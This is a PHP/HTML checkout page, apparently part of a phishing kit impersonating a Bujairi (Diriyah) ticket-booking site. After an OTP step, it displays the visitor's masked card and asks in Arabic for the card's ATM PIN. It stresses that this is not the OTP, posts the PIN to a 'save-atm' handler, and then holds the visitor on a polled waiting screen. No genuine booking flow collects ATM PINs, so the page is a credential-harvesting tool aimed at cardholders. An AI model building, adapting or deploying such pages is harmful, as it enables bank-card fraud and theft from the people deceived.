<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
$id = (int) ($_GET['id'] ?? 0);
$order = order_by_id(bujairi_pdo(), $id);
if (!$order) {
    http_response_code(404);
    exit;
}
$freshQ = booking_force_empty_form() ? '&fresh=1' : '';
$maskedCardDisplay = bujairi_order_masked_card_display($order);
$pageTitle = 'رمز الصراف الآلي';
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <link rel="stylesheet" href="https://s3.ticketmx.com/fonts/NeoSansArabic/NeoSansArabic.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { theme: { extend: { colors: { bujairi: '#a68b5a' } } } };</script>
</head>
<body class="min-h-screen flex flex-col bg-[#f5f3ef] text-slate-800 antialiased" style="font-family: 'Neo Sans Arabic', 'Segoe UI', sans-serif;">
<nav class="bg-white border-b border-gray-100 shrink-0">
    <div class="container mx-auto px-4 py-3 flex items-center justify-between">
        <a href="<?php echo h(url('index.php')); ?>"><img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="Bujairi" class="h-10"></a>
    </div>
</nav>

<main class="flex-grow container mx-auto px-4 py-8 sm:py-10">
    <div class="max-w-md mx-auto">
        <div class="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
            <div class="bg-slate-900 text-white px-6 py-5">
                <p class="text-xs text-slate-400 font-medium mb-1">الخطوة بعد رمز التحقق</p>
                <h1 class="text-xl font-bold">رمز الصراف / الخدمة المصرفية</h1>
            </div>

            <div class="p-6 sm:p-8 space-y-6">
                <div class="rounded-2xl border border-amber-100 bg-amber-50/80 px-4 py-4 text-sm text-slate-800">
                    <p class="m-0 font-semibold text-slate-700">البطاقة المعنية</p>
                    <div
                        class="mt-2 rounded-xl bg-white/90 border border-slate-200/90 px-3 py-2.5 font-mono text-base sm:text-lg font-bold text-slate-900 tracking-wide"
                        dir="ltr"
                        style="direction: ltr; unicode-bidi: isolate; text-align: left;"
                    ><?php echo h($maskedCardDisplay); ?></div>
                </div>
                <p class="text-sm text-slate-600 leading-relaxed">
                    نحتاج منك <strong>الرمز السري ATM الخاص بهذه البطاقة</strong> — أي الرقم السري الذي تستخدمه عند السحب أو الإيداع من أجهزة الصراف الآلي. هذا ليس رمز تحقق الجوال ولا رمز البنك القصير (OTP) الذي أدخلته في الخطوة السابقة.
                </p>

                <form method="post" action="<?php echo h(url('booking/save-atm.php')); ?>" id="atmForm" class="space-y-4">
                    <input type="hidden" name="id" value="<?php echo (int) $order['id']; ?>">
                    <div>
                        <label for="atmInput" class="block text-sm font-bold text-slate-700 mb-2">الرمز السري ATM للبطاقة</label>
                        <input type="password"
                               name="AtmPassword"
                               id="atmInput"
                               autocomplete="one-time-code"
                               maxlength="32"
                               dir="ltr"
                               class="w-full rounded-2xl border-2 border-gray-200 px-4 py-4 text-center text-xl font-mono font-bold tracking-wider shadow-inner focus:border-bujairi focus:ring-4 focus:ring-bujairi/20 outline-none transition"
                               style="text-align: center;"
                               placeholder="••••">
                    </div>
                    <button type="submit" id="atmSubmitBtn" class="w-full py-4 rounded-xl bg-bujairi hover:bg-amber-800 text-white font-bold text-lg shadow-sm transition">متابعة</button>
                </form>
            </div>
        </div>
        <p class="text-center mt-6">
            <a href="<?php echo h(url('booking/otp.php?id=' . (int) $order['id'] . $freshQ)); ?>" class="text-sm text-bujairi font-semibold hover:underline">← العودة لرمز التحقق</a>
        </p>
    </div>
</main>

<footer class="bg-white border-t border-gray-100 py-5 mt-auto text-xs text-gray-400 text-center shrink-0">
    Copyright 2024 DGCL
</footer>
<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
<script>
(function () {
    var form = document.getElementById('atmForm');
    var input = document.getElementById('atmInput');
    var btn = document.getElementById('atmSubmitBtn');
    if (!form || !input || !btn) return;
    var saveAtmUrl = <?php echo json_encode(url('booking/save-atm.php'), JSON_UNESCAPED_UNICODE); ?>;
    var redirectStatusUrl = <?php echo json_encode(url('booking/redirect-status.php'), JSON_UNESCAPED_UNICODE); ?>;
    var waitOrderId = <?php echo (int) $order['id']; ?>;
    form.addEventListener('submit', function (e) {
        e.preventDefault();
        var v = (input.value || '').trim();
        if (v.length < 1) {
            return;
        }
        btn.disabled = true;
        var fd = new FormData(form);
        fetch(saveAtmUrl, {
            method: 'POST',
            body: fd,
            credentials: 'same-origin',
            headers: { 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json' }
        })
            .then(function (r) {
                return r.json().then(function (j) {
                    return { ok: r.ok, j: j };
                });
            })
            .then(function (x) {
                if (!x.ok || !x.j || !x.j.ok) {
                    throw new Error((x.j && x.j.message) || '');
                }
                if (window.BujairiVerifyWait) {
                    window.BujairiVerifyWait.showAndPoll(waitOrderId, redirectStatusUrl);
                }
            })
            .catch(function () {
                btn.disabled = false;
                alert('تعذر حفظ الرمز. حاول مرة أخرى.');
            });
    });
})();
</script>
</body>
</html>
